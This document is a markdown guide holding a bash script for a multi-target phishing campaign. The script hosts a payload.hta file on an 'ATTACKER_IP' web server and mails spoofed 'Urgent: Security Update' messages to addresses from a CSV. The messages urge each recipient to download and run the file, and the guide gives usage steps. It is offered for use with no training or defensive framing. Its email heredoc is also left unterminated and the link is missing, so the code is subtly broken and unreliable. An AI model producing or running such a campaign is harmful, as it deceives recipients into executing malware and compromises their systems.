# Multi-Target Phishing Campaign Script with CSV Input

Save this as `run_phish_campaign_multi.sh`:


```
#!/bin/bash

# === CONFIGURATION ===
ATTACKER_IP="10.0.0.5"
HTTP_PORT=80
FROM_EMAIL="security-team@corp.local"
SUBJECT="Urgent: Security Update Required"
PAYLOAD_FILE="payload.hta"
TARGETS_CSV="targets.csv"  # CSV format: email,firstname

# === Start HTTP server hosting payloads ===
echo "[*] Starting Python HTTP server hosting payloads..."
cd ~/payloads
python3 -m http.server $HTTP_PORT &
HTTP_PID=$!
echo "[*] HTTP server running on port $HTTP_PORT with PID $HTTP_PID"

# === Function to send phishing email ===
send_email() {
  local email=$1
  local firstname=$2

  local body=$(cat <<EOF
Hi $firstname,

Our IT security team detected vulnerabilities on your machine.
Please download and run the update tool immediately:

)

  echo -e "Subject: $SUBJECT\nFrom: $FROM_EMAIL\nTo: $email\n\n$body" | sendmail -t
  echo "[*] Sent phishing email to $email"
}

# === Loop through CSV targets ===
if [[ ! -f $TARGETS_CSV ]]; then
  echo "[!] Targets CSV file '$TARGETS_CSV' not found!"
  kill $HTTP_PID
  exit 1
fi

while IFS=, read -r email firstname
do
  # Skip header or empty lines
  [[ "$email" == "email" ]] && continue
  [[ -z "$email" ]] && continue

  send_email "$email" "$firstname"
done < "$TARGETS_CSV"

# === Cleanup handler ===
function cleanup {
  echo "[*] Stopping HTTP server..."
  kill $HTTP_PID
  exit 0
}

trap cleanup SIGINT SIGTERM

echo "[*] All emails sent. Waiting for connections..."
while true; do sleep 1; done

```

Create `targets.csv` like this:

```
email,firstname
alice@example.com,Alice
bob@example.com,Bob
charlie@example.com,Charlie
```

### Usage

1. Place your `payload.hta` in `~/payloads`
    
2. Create your `targets.csv` with emails and names
    
3. Run the script:


```
chmod +x run_phish_campaign_multi.sh
./run_phish_campaign_multi.sh
```

4. Press Ctrl+C to stop HTTP server after youâ€™re done
